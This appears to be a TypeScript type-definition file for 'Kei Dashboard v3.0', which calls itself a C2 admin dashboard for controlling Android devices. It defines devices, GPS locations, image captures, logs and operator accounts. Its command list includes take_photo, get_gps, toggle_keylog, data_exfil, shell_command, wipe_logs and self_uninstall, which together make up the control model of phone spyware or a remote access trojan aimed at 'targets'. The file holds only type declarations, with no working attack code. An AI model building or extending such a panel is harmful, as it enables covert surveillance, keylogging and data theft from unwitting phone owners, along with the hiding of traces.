/**
 * Type definitions for Kei Dashboard v3.0 - Professional C2 Admin Dashboard
 */

export type DeviceStatus = 'online' | 'offline' | 'idle' | 'active' | 'sleeping';

export interface Device {
  id: string;
  model: string;
  status: DeviceStatus;
  battery: number;
  android_version: string;
  ip_address: string;
  last_ping: number;
  lastSeen?: number;
  os?: string;
  ipAddress?: string;
  storage_used?: number;
  storage_total?: number;
}

export interface Location {
  deviceId: string;
  lat: number;
  lng: number;
  latitude?: number;
  longitude?: number;
  timestamp: number;
  accuracy?: number;
  speed?: number;
  heading?: number;
}

export type CommandAction = 'take_photo' | 'get_gps' | 'wipe_logs' | 'toggle_keylog' | 'self_uninstall' | 'shell_command' | 'data_exfil';

export interface Command {
  id?: string;
  deviceId: string;
  action: CommandAction;
  task?: CommandAction; // Legacy support
  timestamp: number;
  status: 'pending' | 'executing' | 'completed' | 'failed';
  payload?: Record<string, any>;
  priority?: 'low' | 'normal' | 'high' | 'critical';
  force?: boolean;
}

export interface SystemLog {
  id?: string;
  timestamp: number;
  type: 'info' | 'warning' | 'error' | 'success' | 'command';
  message: string;
  device_id?: string;
  deviceId?: string;
  severity?: 'low' | 'medium' | 'high' | 'critical';
  data?: Record<string, any>;
}

export interface DashboardStats {
  totalDevices: number;
  activeDevices: number;
  activeSessions: number;
  totalStorage: number;
  usedStorage: number;
  totalTargets?: number;
  averageBattery?: number;
  commandsPending?: number;
  lastUpdate?: number;
}

export interface ImageCapture {
  id: string;
  url: string;
  name: string;
  path: string;
  timestamp: number;
  deviceId?: string;
  size?: number;
  type?: string;
}

export interface FirebaseConfig {
  apiKey: string;
  authDomain: string;
  projectId: string;
  storageBucket: string;
  messagingSenderId: string;
  appId: string;
}

export interface AuthUser {
  uid: string;
  email: string;
  displayName?: string;
  role: 'admin' | 'operator' | 'viewer';
  createdAt: number;
  lastLogin: number;
}
